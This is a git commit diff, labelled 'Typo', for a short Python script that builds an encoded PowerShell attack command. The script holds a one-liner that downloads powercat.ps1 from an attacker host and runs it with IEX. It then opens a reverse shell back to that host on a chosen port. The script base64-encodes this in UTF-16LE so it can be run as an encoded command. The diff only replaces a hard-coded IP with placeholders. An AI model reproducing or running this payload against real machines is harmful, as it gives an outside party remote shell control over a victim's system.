3e07f4b0eecb1a5fc6ea0f9e09cc731e9c6d4ce5
ThomasBucaioni <thomas.bucaioni@gmail.com>
2023-09-18 19:28:50 +0200

    Typo

--- microsoft/powershell_powercat_encoding.py
+++ microsoft/powershell_powercat_encoding.py
@@ -1,6 +1,6 @@
 import base64
 
-text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.175/powercat.ps1');powercat -c 192.168.45.175 -p 4444 -e powershell"
+text = "IEX(New-Object System.Net.WebClient).DownloadString('http://$AttackerIp/powercat.ps1');powercat -c $AttackerIp -p $AttackerPort -e powershell"
 
 payload = base64.b64encode(bytes(text, 'utf-16-le')).decode('utf-8')
 
